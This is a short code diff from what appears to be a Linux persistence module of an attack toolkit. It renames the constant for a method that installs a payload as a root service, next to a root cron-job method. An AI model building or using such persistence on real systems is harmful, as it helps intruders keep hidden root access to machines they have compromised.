@@ -60,7 +60,7 @@ class LinuxPersistence(Persistence):
             cronjob.install_root()
             return
 
-        if method == LinuxPersistenceMethods.SILLYSERVICE_ROOT.value:
+        if method == LinuxPersistenceMethods.SYSTEMDSERVICE_ROOT.value:
             service = createService(self.payload)
             service.sillySit()
             return
